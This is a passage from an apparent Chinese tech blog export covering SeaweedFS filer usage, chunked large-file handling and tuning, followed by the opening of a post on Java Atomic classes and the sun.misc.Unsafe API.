对于目录重命名，它将是O（N）操作，其中N是要重命名目录下的文件和文件夹的数量。这是因为他们每个人都需要调整元数据。但是，卷服务器上的实际文件内容仍然没有变化。 用例 客户可以通过HTTP评估一个“weed filer”，列出目录下的文件，通过HTTP POST创建文件，直接通过HTTP POST读取文件。 虽然一个“weed filer”只能位于一台机器上，但您可以在多台机器上启动多个“weed filer”，每个“weed filer”实例在其自己的集合中运行，具有自己的命名空间，但共享相同的SeaweedFS存储。 Filer线性可扩展 Filer被设计为线性可伸缩的，并且仅受底层元数据存储的限制。 Filer工作负载 Filer有两个用例。 当filer直接用于上传和下载文件时，以及与“weed s3”一起使用时，文件管理器还需要在读取和写入期间处理文件内容以及元数据。所以添加多个文件服务器是个好主意。 当filer与“weed mount”一起使用时，filer仅提供文件元数据检索。实际文件内容直接在“weed mount”和“weed volume”服务器之间读写。所以文件管理器没有那么多。 文件管理器命令和操作复制到Filerweed filer.copy 可以将一个或一个文件或目录列表复制到文件管理器。 1234567891011&#x2F;&#x2F; copy all go files under current directory to filer&#39;s &#x2F;github&#x2F; folder.&#x2F;&#x2F; The directory structure is copied also.&gt; weed filer.copy -include *.go . http:&#x2F;&#x2F;localhost:8888&#x2F;github&#x2F;...Copy .&#x2F;unmaintained&#x2F;change_replication&#x2F;change_replication.go &#x3D;&gt; http:&#x2F;&#x2F;localhost:8888&#x2F;github&#x2F;.&#x2F;unmaintained&#x2F;change_replication&#x2F;change_replication.goCopy .&#x2F;unmaintained&#x2F;fix_dat&#x2F;fix_dat.go &#x3D;&gt; http:&#x2F;&#x2F;localhost:8888&#x2F;github&#x2F;.&#x2F;unmaintained&#x2F;fix_dat&#x2F;fix_dat.goCopy .&#x2F;unmaintained&#x2F;see_idx&#x2F;see_idx.go &#x3D;&gt; http:&#x2F;&#x2F;localhost:8888&#x2F;github&#x2F;.&#x2F;unmaintained&#x2F;see_idx&#x2F;see_idx.goCopy .&#x2F;weed&#x2F;command&#x2F;backup.go &#x3D;&gt; http:&#x2F;&#x2F;localhost:8888&#x2F;github&#x2F;.&#x2F;weed&#x2F;command&#x2F;backup.goCopy .&#x2F;weed&#x2F;command&#x2F;benchmark.go &#x3D;&gt; http:&#x2F;&#x2F;localhost:8888&#x2F;github&#x2F;.&#x2F;weed&#x2F;command&#x2F;benchmark.goCopy .&#x2F;weed&#x2F;command&#x2F;command.go &#x3D;&gt; http:&#x2F;&#x2F;localhost:8888&#x2F;github&#x2F;.&#x2F;weed&#x2F;command&#x2F;command.goCopy .&#x2F;weed&#x2F;command&#x2F;compact.go &#x3D;&gt; http:&#x2F;&#x2F;localhost:8888&#x2F;github&#x2F;.&#x2F;weed&#x2F;command&#x2F;compact.go 大文件处理为了实现高并发性，SeaweedFS尝试将整个文件读写并写入内存。但这对大文件不起作用。 以下是在“weed upload”命令中实现的。对于第三方客户，这是规范. 为了支持大文件，SeaweedFS支持以下两种文件： 块文件。每个块文件实际上只是SeaweedFS的普通文件。大块文件。一个简单的json文件，包含所有块的列表。 这段代码显示了json文件结构： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225package operationimport ( &quot;encoding/json&quot; &quot;errors&quot; &quot;fmt&quot; &quot;io&quot; &quot;io/ioutil&quot; &quot;net/http&quot; &quot;sort&quot; &quot;google.golang.org/grpc&quot; &quot;sync&quot; &quot;github.com/chrislusf/seaweedfs/weed/glog&quot; &quot;github.com/chrislusf/seaweedfs/weed/util&quot;)var ( // when the remote server does not allow range requests (Accept-Ranges was not set) ErrRangeRequestsNotSupported = errors.New(&quot;Range requests are not supported by the remote server&quot;) // ErrInvalidRange is returned by Read when trying to read past the end of the file ErrInvalidRange = errors.New(&quot;Invalid range&quot;))type ChunkInfo struct &#123; Fid string `json:&quot;fid&quot;` Offset int64 `json:&quot;offset&quot;` Size int64 `json:&quot;size&quot;`&#125;type ChunkList []*ChunkInfotype ChunkManifest struct &#123; Name string `json:&quot;name,omitempty&quot;` Mime string `json:&quot;mime,omitempty&quot;` Size int64 `json:&quot;size,omitempty&quot;` Chunks ChunkList `json:&quot;chunks,omitempty&quot;`&#125;// seekable chunked file readertype ChunkedFileReader struct &#123; Manifest *ChunkManifest Master string pos int64 pr *io.PipeReader pw *io.PipeWriter mutex sync.Mutex&#125;func (s ChunkList) Len() int &#123; return len(s) &#125;func (s ChunkList) Less(i, j int) bool &#123; return s[i].Offset &lt; s[j].Offset &#125;func (s ChunkList) Swap(i, j int) &#123; s[i], s[j] = s[j], s[i] &#125;func LoadChunkManifest(buffer []byte, isGzipped bool) (*ChunkManifest, error) &#123; if isGzipped &#123; var err error if buffer, err = util.UnGzipData(buffer); err != nil &#123; return nil, err &#125; &#125; cm := ChunkManifest&#123;&#125; if e := json.Unmarshal(buffer, &amp;cm); e != nil &#123; return nil, e &#125; sort.Sort(cm.Chunks) return &amp;cm, nil&#125;func (cm *ChunkManifest) Marshal() ([]byte, error) &#123; return json.Marshal(cm)&#125;func (cm *ChunkManifest) DeleteChunks(master string, grpcDialOption grpc.DialOption) error &#123; var fileIds []string for _, ci := range cm.Chunks &#123; fileIds = append(fileIds, ci.Fid) &#125; results, err := DeleteFiles(master, grpcDialOption, fileIds) if err != nil &#123; glog.V(0).Infof(&quot;delete %+v: %v&quot;, fileIds, err) return fmt.Errorf(&quot;chunk delete: %v&quot;, err) &#125; for _, result := range results &#123; if result.Error != &quot;&quot; &#123; glog.V(0).Infof(&quot;delete file %+v: %v&quot;, result.FileId, result.Error) return fmt.Errorf(&quot;chunk delete %v: %v&quot;, result.FileId, result.Error) &#125; &#125; return nil&#125;func readChunkNeedle(fileUrl string, w io.Writer, offset int64) (written int64, e error) &#123; req, err := http.NewRequest(&quot;GET&quot;, fileUrl, nil) if err != nil &#123; return written, err &#125; if offset &gt; 0 &#123; req.Header.Set(&quot;Range&quot;, fmt.Sprintf(&quot;bytes=%d-&quot;, offset)) &#125; resp, err := util.Do(req) if err != nil &#123; return written, err &#125; defer func() &#123; io.Copy(ioutil.Discard, resp.Body) resp.Body.Close() &#125;() switch resp.StatusCode &#123; case http.StatusRequestedRangeNotSatisfiable: return written, ErrInvalidRange case http.StatusOK: if offset &gt; 0 &#123; return written, ErrRangeRequestsNotSupported &#125; case http.StatusPartialContent: break default: return written, fmt.Errorf(&quot;Read chunk needle error: [%d] %s&quot;, resp.StatusCode, fileUrl) &#125; return io.Copy(w, resp.Body)&#125;func (cf *ChunkedFileReader) Seek(offset int64, whence int) (int64, error) &#123; var err error switch whence &#123; case 0: case 1: offset += cf.pos case 2: offset = cf.Manifest.Size - offset &#125; if offset &gt; cf.Manifest.Size &#123; err = ErrInvalidRange &#125; if cf.pos != offset &#123; cf.Close() &#125; cf.pos = offset return cf.pos, err&#125;func (cf *ChunkedFileReader) WriteTo(w io.Writer) (n int64, err error) &#123; cm := cf.Manifest chunkIndex := -1 chunkStartOffset := int64(0) for i, ci := range cm.Chunks &#123; if cf.pos &gt;= ci.Offset &amp;&amp; cf.pos &lt; ci.Offset+ci.Size &#123; chunkIndex = i chunkStartOffset = cf.pos - ci.Offset break &#125; &#125; if chunkIndex &lt; 0 &#123; return n, ErrInvalidRange &#125; for ; chunkIndex &lt; cm.Chunks.Len(); chunkIndex++ &#123; ci := cm.Chunks[chunkIndex] // if we need read date from local volume server first? fileUrl, lookupError := LookupFileId(cf.Master, ci.Fid) if lookupError != nil &#123; return n, lookupError &#125; if wn, e := readChunkNeedle(fileUrl, w, chunkStartOffset); e != nil &#123; return n, e &#125; else &#123; n += wn cf.pos += wn &#125; chunkStartOffset = 0 &#125; return n, nil&#125;func (cf *ChunkedFileReader) ReadAt(p []byte, off int64) (n int, err error) &#123; cf.Seek(off, 0) return cf.Read(p)&#125;func (cf *ChunkedFileReader) Read(p []byte) (int, error) &#123; return cf.getPipeReader().Read(p)&#125;func (cf *ChunkedFileReader) Close() (e error) &#123; cf.mutex.Lock() defer cf.mutex.Unlock() return cf.closePipe()&#125;func (cf *ChunkedFileReader) closePipe() (e error) &#123; if cf.pr != nil &#123; if err := cf.pr.Close(); err != nil &#123; e = err &#125; &#125; cf.pr = nil if cf.pw != nil &#123; if err := cf.pw.Close(); err != nil &#123; e = err &#125; &#125; cf.pw = nil return e&#125;func (cf *ChunkedFileReader) getPipeReader() io.Reader &#123; cf.mutex.Lock() defer cf.mutex.Unlock() if cf.pr != nil &amp;&amp; cf.pw != nil &#123; return cf.pr &#125; cf.closePipe() cf.pr, cf.pw = io.Pipe() go func(pw *io.PipeWriter) &#123; _, e := cf.WriteTo(pw) pw.CloseWithError(e) &#125;(cf.pw) return cf.pr&#125; 1234567891011121314type ChunkInfo struct &#123; Fid string `json:&quot;fid&quot;` Offset int64 `json:&quot;offset&quot;` Size int64 `json:&quot;size&quot;`&#125;type ChunkList []*ChunkInfotype ChunkManifest struct &#123; Name string `json:&quot;name,omitempty&quot;` Mime string `json:&quot;mime,omitempty&quot;` Size int64 `json:&quot;size,omitempty&quot;` Chunks ChunkList `json:&quot;chunks,omitempty&quot;`&#125; 在读取Chunk Manifest文件时，SeaweedFS将根据ChunkInfo列表查找并发送数据文件。 创建新的大文件SeaweedFS将努力委托给客户方。步骤是： 将大文件拆分成块 像往常一样上传每个文件块，使用mime类型“application / octet-stream”。将相关信息保存到ChunkInfo结构中。每个块可以分布到不同的卷上，可能提供更快的并行访问。使用mime类型“application / json”上传清单文件，并添加url参数“cm = true”。存储清单文件的FileId是大文件的入口点。 更新大文件通常我们只是附加大文件。更新特定的文件块几乎是一样的。附加大文件的步骤： 像往常一样上传新文件块，使用mime类型“application / octet-stream”。将相关信息保存到ChunkInfo结构中。使用mime类型“application / json”更新更新的清单文件，并添加url参数“cm = true”。 优化以下是优化SeaweedFS的策略或最佳方法。 使用LevelDB启动卷服务器时，可以指定索引类型。默认情况下它使用内存。启动卷服务器时这很快，但启动时间可能很长，以便将文件索引加载到内存中。 weed volume -index=leveldb可以改为leveldb。启动卷服务器要快得多，但访问文件时要慢一点。与网络速度相比，在大多数情况下额外的成本并不是那么多。 预分配卷文件磁盘空间在某些Linux文件系统中，例如XFS，ext4，Btrfs等，SeaweedFS可以选择为卷文件分配磁盘空间。这可以确保文件数据位于连续的块上，这可以在文件很大时提高性能，并且可以覆盖多个扩展区。 要启用磁盘空间预迁移，请在具有支持文件系统的Linux OS上使用这些选项启动主站。 1234-volumePreallocate Preallocate disk space for volumes. -volumeSizeLimitMB uint Master stops directing writes to oversized volumes. (default 30000) 增加并发写入默认情况下，SeaweedFS会自动增大卷。例如，对于非复制卷，将同时分配7个可写卷。 如果要将写入分发到更多卷，可以通过此URL指示SeaweedFS master。 1curl http：&#x2F;&#x2F; localhost：9333 &#x2F; vol &#x2F; grow ？count &#x3D; 12 ＆ replication &#x3D; 001 这将为12个卷分配001复制。由于001复制意味着相同数据的2个副本，因此实际上将消耗24个物理卷。 增加并发读取与上面相同，更多卷将增加读并发性。 另外，增加复制也会有所帮助。将相同的数据存储在多个服务器上肯定会增加读取并发性。 添加更多硬盘更多硬盘将为您提供更好的写入/读取吞吐量。 增加用户打开文件限制 SeaweedFS通常只打开一些实际的磁盘文件。但是网络文件请求可能超过默认限制，通常默认为1024.对于生产，您需要root权限才能将限制增加到更高的限制，例如“ulimit -n 10240”。 内存消耗对于卷服务器，内存消耗与文件数密切相关。例如，如果每个文件只有20KB，则一个32G卷可以轻松拥有150万个文件。为了将150万个元数据条目存储在内存中，目前SeaweedFS消耗36MB内存，每个内存大约24字节。因此，如果您分配64个卷（2TB），则需要2个卷3GB内存。但是，如果平均文件大小较大，例如200KB，则只有200需要300MB内存。 SeaweedFS还具有leveldb，boltdb和btree模式支持，可以进一步降低内存消耗。 要使用它，“weed server -volume.index = [memory | leveldb | boltdb | btree]”或“weed volume -index = [memory | leveldb | boltdb | btree]”。您可以随时尽可能在4种模式之间切换。如果leveldb或boltdb的文件已过期或缺失，将根据需要重新生成它们。 boltdb的编写速度相当慢，大约需要6分钟来重建1553934文件的索引。Boltdb从磁盘加载1,553,934 x 16 = 24,862,944bytes，并在6分钟内生成大小为134,217,728字节的boltdb。为了进行比较，leveldb在8秒内重新创建了大到27,188,148字节的索引。 要测试内存消耗，请创建leveldb或boltdb索引。基准集合中共有7卷，每卷约有1553K个文件。服务器重新启动，然后我启动基准测试工具来读取大量文件。对于leveldb，服务器内存从142,884KB开始，并保持在179,340KB。对于boltdb，服务器内存从73,756KB开始，并保持在144,564KB。对于内存，服务器内存从368,152KB开始，并保持在448,032KB。 为了测试写入速度，我使用带有默认参数的基准测试工具。对于boltdb，写入大约是4.1MB / s，4.1K文件/ s对于leveldb，写入大约是10.4MB / s，10.4K文件/ s对于内存来说，它更快一点，没有统计差异。但我使用SSD，而os缓冲区缓存也会影响数字。所以你的结果可能会有所不同。 在v0.75中添加了Btree模式，以优化无序自定义文件密钥的内存。对于SeaweedFS主服务器分配的普通文件密钥，Btree模式可能会花费更多内存，但通常比自定义文件密钥更有效。请测试你的病例。 注意：BoltDB的限制是32位系统上的最大db大小为256MB。 使用您自己的密钥插入文件ID生成实际上非常简单，您可以使用自己的方式生成文件密钥。 文件密钥有3个部分： volume id：具有可用空间的卷 针头ID：单调增加且唯一的数字 文件cookie：随机数，您可以以任何方式自定义它 您可以直接要求主服务器分配文件密钥，并将针ID部分替换为您自己的唯一ID，例如用户ID。 您还可以从服务器状态获取每个卷的可用空间。 1curl “ http：&#x2F;&#x2F; localhost：9333 &#x2F; dir &#x2F; status？pretty &#x3D; y ” 一旦确定了无空间空间，就可以使用自己的文件ID。只需要确保文件密钥格式兼容。 指定的文件cookie也可以自定义。 自定义针ID和/或文件cookie是可接受的行为。“严格单调增加”不是必需的，但是为了保持存储器数据结构的有效性，期望保持文件id以“大多数”增加的顺序。 上传大文件如果文件很大且网络很慢，服务器将花费时间来读取文件。请增加卷服务器的“-readTimeout = 3”限制设置。如果上传时间超过限制，则会切断连接。 使用“自动拆分/合并”上载大型文件如果文件很大，最好以这种方式上传： 1weed upload -maxMB &#x3D; 64 the_file_name 这会将文件拆分为每个64MB的数据块，并单独上传。所有数据块的文件ID都保存到另一个元块中。返回元块的文件ID。下载文件时，只需 1weed download the_meta_chunk_file_id 元块具有文件ID列表，每行上有每个文件ID。因此，如果要并行处理它们，可以下载元块并直接处理每个数据块。 集合作为简单名称空间分配文件ID时， 12curl http:&#x2F;&#x2F;master:9333&#x2F;dir&#x2F;assign?collection&#x3D;picturescurl http:&#x2F;&#x2F;master:9333&#x2F;dir&#x2F;assign?collection&#x3D;documents 如果尚未创建“图片”集合和“文档”集合，也会生成它们。每个集合都有其专用卷，并且它们不会共享相同的卷。实际上，实际数据文件具有集合名称作为前缀，例如“pictures_1.dat”，“documents_3.dat”。 Java操作SeaweedFS首先导入pom依赖 12345&lt;dependency&gt; &lt;groupId&gt;net.anumbrella.seaweedfs&lt;/groupId&gt; &lt;artifactId&gt;seaweedfs-java-client&lt;/artifactId&gt; &lt;version&gt;0.0.2.RELEASE&lt;/version&gt; &lt;/dependency&gt; 编写SeaweedFS配置类SeaweedFSConfig 123456789101112131415161718192021222324@Configurationpublic class SeaweedFSConfig &#123; @Value(&quot;$&#123;seaweedfs.host&#125;&quot;) private String host; @Value(&quot;$&#123;seaweedfs.port&#125;&quot;) private int port; @Bean public FileTemplate fileTemplate() &#123; FileSource fileSource = new FileSource(); // SeaweedFS master服务ip地址 fileSource.setHost(host); // SeaweedFS master服务端口 fileSource.setPort(port); try &#123; // 启动服务 fileSource.startup(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return new FileTemplate(fileSource.getConnection()); &#125;&#125; 我的application.properties配置文件如下: 12seaweedfs.host=192.168.6.224 #多个ip地址用逗号隔开seaweedfs.port=9333 上传文件的方法如下,用的是Spring的JUnit测试: 1234567891011121314@Autowiredprivate FileTemplate template;@Testpublic void testSeaweedFS() throws IOException &#123; // 上传可以指定文件名 FileHandleStatus handleStatus = template.saveFileByStream(&quot;file.type&quot;, new FileInputStream(new File(&quot;filePath&quot;))); // 获取文件ID,可通过这个ID获取到文件 String fileId = handleStatus.getFileId(); StreamResponse fileStream = template.getFileStream(fileId); InputStream inputStream = fileStream.getInputStream(); // 获取流之后流拷贝输出到本地 IOUtils.copy(inputStream,new FileOutputStream(new File(&quot;outPath&quot;))); &#125;","categories":[{"name":"工具","slug":"工具","permalink":"https://gschaos.club/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"SeaweedFS","slug":"SeaweedFS","permalink":"https://gschaos.club/tags/SeaweedFS/"},{"name":"分布式文件系统","slug":"分布式文件系统","permalink":"https://gschaos.club/tags/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"}]},{"title":"并发编程之Atomic&Unsafe魔法类详解","slug":"AtomicUnsafe","date":"2019-09-28T16:00:00.000Z","updated":"2020-09-09T16:00:00.000Z","comments":true,"path":"AtomicUnsafe/","link":"","permalink":"https://gschaos.club/AtomicUnsafe/","excerpt":"并发编程之Atomic&amp;Unsafe魔法类详解–原子（atom）本意是“不能被进一步分割的最小粒子”，而原子操作（atomic operation）意为”不可被中断的一个或一系列操作”。在多处理器上实现原子操作就变得有点复杂。本文让我们一起来聊一聊在Inter处理器和Java里是如何实现原子操作的。","text":"并发编程之Atomic&amp;Unsafe魔法类详解–原子（atom）本意是“不能被进一步分割的最小粒子”，而原子操作（atomic operation）意为”不可被中断的一个或一系列操作”。在多处理器上实现原子操作就变得有点复杂。本文让我们一起来聊一聊在Inter处理器和Java里是如何实现原子操作的。 并发编程之Atomic&amp;Unsafe魔法类详解一、什么是原子操作？原子（atom）本意是“不能被进一步分割的最小粒子”，而原子操作（atomic operation）意为”不可被中断的一个或一系列操作”。在多处理器上实现原子操作就变得有点复杂。本文让我们一起来聊一聊在Inter处理器和Java里是如何实现原子操作的。 1、相关术语 术语名称 英文 缓存行 Cache line 比较并交换 Compare and Swap CPU流水线 CPU pipeline 内存顺序冲突 Memory order violation 二、CPU原子操作的实现方式32位IA-32处理器使用基于对缓存加锁或总线加锁的方式来实现多处理器之间的原子操作。 1、处理器自动保证基本内存操作的原子性 首先处理器会自动保证基本的内存操作的原子性。处理器保证从系统内存当中读取或者写入一个字节是原子的，意思是当一个处理器读取一个字节时，其他处理器不能访问这个字 节的内存地址。奔腾6和最新的处理器能自动保证单处理器对同一个缓存行里进行16/32/64位的操作是原子的，但是复杂的内存操作处理器不能自动保证其原子性，比如跨总线宽度， 跨多个缓存行，跨页表的访问。但是处理器提供总线锁定和缓存锁定两个机制来保证复杂内存操作的原子性。 2、使用总线锁保证原子性 第一个机制是通过总线锁保证原子性。如果多个处理器同时对共享变量进行读改写（i++就是经典的读改写操作）操作，那么共享变量就会被多个处理器同时进行操作，这样读改写操作就不是原子的，操作完之后共享变量的值会和期望的不一致，举个例子：如果i=1,我们进行两次i++操作，我们期望的结果是3，但是有可能结果是2。 如下图 原因是有可能多个处理器同时从各自的缓存中读取变量i，分别进行加一操作，然后分别写入系统内存当中。那么想要保证读改写共享变量的操作是原子的，就必须保证CPU1读 改写共享变量的时候，CPU2不能操作缓存了该共享变量内存地址的缓存。 处理器使用总线锁就是来解决这个问题的。所谓总线锁就是使用处理器提供的一个LOCK＃信号，当一个处理器在总线上输出此信号时，其他处理器的请求将被阻塞住,那么该 处理器可以独占使用共享内存。 3、使用缓存锁保证原子性 第二个机制是通过缓存锁定保证原子性。在同一时刻我们只需保证对某个内存地址的操作是原子性即可，但总线锁定把CPU和内存之间通信锁住了，这使得锁定期间，其他处理器不能操作其他内存地址的数据，所以总线锁定的开销比较大，最近的处理器在某些场合下使用缓存锁定代替总线锁定来进行优化。 频繁使用的内存会缓存在处理器的L1，L2和L3高速缓存里，那么原子操作就可以直接在处理器内部缓存中进行，并不需要声明总线锁，在奔腾6和最近的处理器中可以使用“缓存锁定”的方式来实现复杂的原子性。所谓“缓存锁定”就是如果缓存在处理器缓存行中内存区域在LOCK操作期间被锁定，当它执行锁操作回写内存时，处理器不在总线上声言LOCK＃信号，而是修改内部的内存地址，并允许它的缓存一致性机制来保证操作的原子性，因为缓存一致性机制会阻止同时修改被两个以上处理器缓存的内存区域数据，当其他处理器回写已被锁定的缓存行的数据时会起缓存行无效，在例1中，当CPU1修改缓存行中的i时使用缓存锁定，那么CPU2就不能同时缓存了i的缓存行。 但是有两种情况下处理器不会使用缓存锁定。第一种情况是：当操作的数据不能被缓存在处理器内部，或操作的数据跨多个缓存行（cache line），则处理器会调用总线锁定。第二种情况是：有些处理器不支持缓存锁定。对于Inter486和奔腾处理器,就算锁定的内存区域在处理器的缓存行中也会调用总线锁定。 以上两个机制我们可以通过Inter处理器提供了很多LOCK前缀的指令来实现。比如位测试和修改指令BTS，BTR，BTC，交换指令XADD，CMPXCHG和其他一些操作数和逻辑指令，比如ADD（加），OR（或）等，被这些指令操作的内存区域就会加锁，导致其他处理器不能同时访问它。 4、Java当中如何实现原子操作 在java中可以通过锁和循环CAS的方式来实现原子操作。 JVM中的CAS操作正是利用了上文中提到的处理器提供的CMPXCHG指令实现的。自旋CAS实现的基本思路就是循环进行CAS操作直到成功为止，具体的类可以参见juc下的atomic包内的原子类。 三、Atomic在Atomic包里一共有12个类，四种原子更新方式，分别是原子更新基本类型，原子更新数组，原子更新引用和原子更新字段。Atomic包里的类基本都是使用Unsafe实现的包装类。 基本类：AtomicInteger、AtomicLong、AtomicBoolean； 引用类型：AtomicReference、AtomicReference的ABA实例、AtomicStampedRerence、AtomicMarkableReference； 数组类型：AtomicIntegerArray、AtomicLongArray、AtomicReferenceArray； 属性原子修改器（Updater）：AtomicIntegerFieldUpdater、AtomicLongFieldUpdater、AtomicReferenceFieldUpdater； 1、原子更新基本类型类 用于通过原子的方式更新基本类型，Atomic包提供了以下三个类： AtomicBoolean：原子更新布尔类型。 AtomicInteger：原子更新整型。 AtomicLong：原子更新长整型。 AtomicInteger的常用方法如下： int addAndGet(int delta)：以原子方式将输入的数值与实例中的值（AtomicInteger里的value）相加，并返回结果 boolean compareAndSet(int expect,int update)：如果输入的数值等于预期值，则以原子方式将该值设置为输入的值。 int getAndIncrement()：以原子方式将当前值加1，注意：这里返回的是自增前的值。 void lazySet(int newValue)：最终会设置成newValue，使用lazySet设置值后，可能导致其他线程在之后的一小段时间内还是可以读到旧的值。 int getAndSet(int newValue)：以原子方式设置为newValue的值，并返回旧值。 Atomic包提供了三种基本类型的原子更新，但是Java的基本类型里还有char，float和double等。那么问题来了，如何原子的更新其他的基本类型呢？Atomic包里的类基本都是 使用Unsafe实现的，Unsafe只提供了三种CAS方法，compareAndSwapObject，compareAndSwapInt和compareAndSwapLong，再看AtomicBoolean源码，发现其是 先把Boolean转换成整型，再使用compareAndSwapInt进行CAS，所以原子更新double也可以用类似的思路来实现。 2、原子更新数组类 通过原子的方式更新数组里的某个元素，Atomic包提供了以下三个类： AtomicIntegerArray：原子更新整型数组里的元素。 AtomicLongArray：原子更新长整型数组里的元素。 AtomicReferenceArray：原子更新引用类型数组里的元素。 AtomicIntegerArray类主要是提供原子的方式更新数组里的整型， 其常用方法如下 int addAndGet(int i, int delta)：以原子方式将输入值与数组中索引i的元素相加。 boolean compareAndSet(int i, int expect, int update)：如果当前值等于预期值，则以原子方式将数组位置i的元素设置成update值。 3、原子更新引用类型 原子更新基本类型的AtomicInteger，只能更新一个变量，如果要原子的更新多个变量，就需要使用这个原子更新引用类型提供的类。Atomic包提供了以下三个类： AtomicReference：原子更新引用类型。 AtomicReferenceFieldUpdater：原子更新引用类型里的字段。 AtomicMarkableReference：原子更新带有标记位的引用类型。可以原子的更新一个布尔类型的标记位和引用类型。构造方法是AtomicMarkableReference(V initialRef, boolean initialMark) 4、原子更新字段类 如果我们只需要某个类里的某个字段，那么就需要使用原子更新字段类，Atomic包提供了以下三个类： AtomicIntegerFieldUpdater：原子更新整型的字段的更新器。 AtomicLongFieldUpdater：原子更新长整型字段的更新器。 AtomicStampedReference：原子更新带有版本号的引用类型。该类将整数值与引用关联起来，可用于原子的更数据和数据的版本号，可以解决使用CAS进行原子更新时，可能出现的ABA问题。原子更新字段类都是抽象类，每次使用都时候必须使用静态方法newUpdater创建一个更新器。原子更新类的字段的必须使用public volatile修饰符。 四、Unsafe魔法类Unsafe是位于sun.misc包下的一个类，主要提供一些用于执行低级别、不安全操作的方法，如直接访问系统内存资源、自主管理内存资源等，这些方法在提升Java运行效率、增强Java语言底层资源操作能力方面起到了很大的作用。但由于Unsafe类使Java语言拥有了类似C语言指针一样操作内存空间的能力，这无疑也增加了程序发生相关指针问题的风险。在程序中过度、不正确使用Unsafe类会使得程序出错的概率变大，使得Java这种安全的语言变得不再“安全”，因此对Unsafe的使用一定要慎重。 Unsafe类为一单例实现，提供静态方法getUnsafe获取Unsafe实例，当且仅当调用getUnsafe方法的类为引导类加载器所加载时才合法，否则抛出SecurityException异常。 123456789101112131415161718复制public class Unsafe &#123; &#x2F;&#x2F; 单例对象 private static final Unsafe theUnsafe; private Unsafe() &#123; &#125; @CallerSensitive public static Unsafe getUnsafe() &#123; Class var0 &#x3D; Reflection.getCallerClass(); &#x2F;&#x2F;仅在引导类加载器&#96;BootstrapClassLoader&#96;加载时才合法 if (!VM.isSystemDomainLoader(var0.getClassLoader())) &#123; throw new SecurityException(&quot;Unsafe&quot;); &#125; else &#123; return theUnsafe; &#125; &#125;&#125; 1、如何获取Unsafe实例？ 1、从getUnsafe方法的使用限制条件出发，通过Java命令行命令-Xbootclasspath/a把调用Unsafe相关方法的类A所在jar包路径追加到默认的bootstrap路径中，使得A被 引导类加载器加载，从而通过Unsafe.getUnsafe方法安全的获取Unsafe实例。 java ­Xbootclasspath/a:${path} // 其中path为调用Unsafe相关方法的类所在jar包路径 2、通过反射获取单例对象theUnsafe。 123456789101112复制public class UnsafeInstance &#123; public static Unsafe reflectGetUnsafe() &#123; try &#123; Field field &#x3D; Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;); field.setAccessible(true); return (Unsafe) field.get(null); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return null; &#125;&#125; 2、Unsafe功能介绍 Unsafe提供的API大致可分为内存操作、CAS、Class相关、对象操作、线程调度、系统信息获取、内存屏障、数组操作等几类，下面将对其相关方法和应用场景进行详细介绍。 1、内存操作 这部分主要包含堆外内存的分配、拷贝、释放、给定地址值操作等方法。 1234567891011121314151617复制&#x2F;&#x2F;分配内存, 相当于C++的malloc函数 public native long allocateMemory(long bytes); &#x2F;&#x2F;扩充内存 public native long reallocateMemory(long address, long bytes); &#x2F;&#x2F;释放内存 public native void freeMemory(long address);&#x2F;&#x2F;在给定的内存块中设置值 public native void setMemory(Object o, long offset, long bytes, byte value); &#x2F;&#x2F;内存拷贝 public native void copyMemory(Object srcBase, long srcOffset, Object destBase, long destOffset, long bytes); &#x2F;&#x2F;获取给定地址值，忽略修饰限定符的访问限制。与此类似操作还有: getInt， getDouble，getLong，getChar等 public native Object getObject(Object o, long offset); &#x2F;&#x2F;为给定地址设置值，忽略修饰限定符的访问限制，与此类似操作还有: putInt,putDouble，putLong，putChar等 public native void putObject(Object o, long offset, Object x); public native byte getByte(long address); &#x2F;&#x2F;为给定地址设置byte类型的值（当且仅当该内存地址为 allocateMemory分配 时，此方法结果才是确定的） public native void putByte(long address, byte x); 通常，我们在Java中创建的对象都处于堆内内存（heap）中，堆内内存是由JVM所管控的Java进程内存，并且它们遵循JVM的内存管理机制，JVM会采用垃圾回收机制统一管理堆内存。与之相对的是堆外内存，存在于JVM管控之外的内存区域，Java中对堆外内存的操作，依赖于Unsafe提供的操作堆外内存的native方法。 使用堆外内存的原因 ①对垃圾回收停顿的改善。由于堆外内存是直接受操作系统管理而不是JVM，所以当我们使用堆外内存时，即可保持较小的堆内内存规模。从而在GC时减少回收停顿对于应用的影响。 ②提升程序I/O操作的性能。通常在I/O通信过程中，会存在堆内内存到堆外内存的数据拷贝操作，对于需要频繁进行内存间数据拷贝且生命周期较短的暂存数据，都建议存储到堆外内存。 典型应用 DirectByteBuffer是Java用于实现堆外内存的一个重要类，通常用在通信过程中做缓冲池，如在Netty、MINA等NIO框架中应用广泛。DirectByteBuffer对于堆外内存的创建、使用、销毁等逻辑均由Unsafe提供的堆外内存API来实现。 下图为DirectByteBuffer构造函数，创建DirectByteBuffer的时候，通过Unsafe.allocateMemory分配内存、Unsafe.setMemory进行内存初始化，而后构建Cleaner对象用于跟踪DirectByteBuffer对象的垃圾回收，以实现当DirectByteBuffer被垃圾回收时，分配的堆外内存一起被释放。 2、CAS相关 如下源代码释义所示，这部分主要为CAS相关操作的方法。 1234567891011复制&#x2F;*** CAS* @param o 包含要修改field的对象 * @param offset 对象中某field的偏移量 * @param expected 期望值 * @param update 更新值 * @return true | false *&#x2F;public final native boolean compareAndSwapObject(Object var1,long var2,Object var4,Object var5);public final native boolean compareAndSwapInt(Object var1,long var2,int var4,int var5);public final native boolean compareAndSwapLong(Object var1,long var2,long var4,long var6); 典型应用 如下图所示，AtomicInteger的实现中，静态字段valueOffset即为字段value的内存偏移地址，valueOffset的值在AtomicInteger初始化时，在静态代码块中通过Unsafe的objectFieldOffset方法获取。在AtomicInteger中提供的线程安全方法中，通过字段valueOffset的值可以定位到AtomicInteger对象中value的内存地址，从而可以根据CAS实现对value字段的原子操作。 下图为某个AtomicInteger对象自增操作前后的内存示意图，对象的基地址 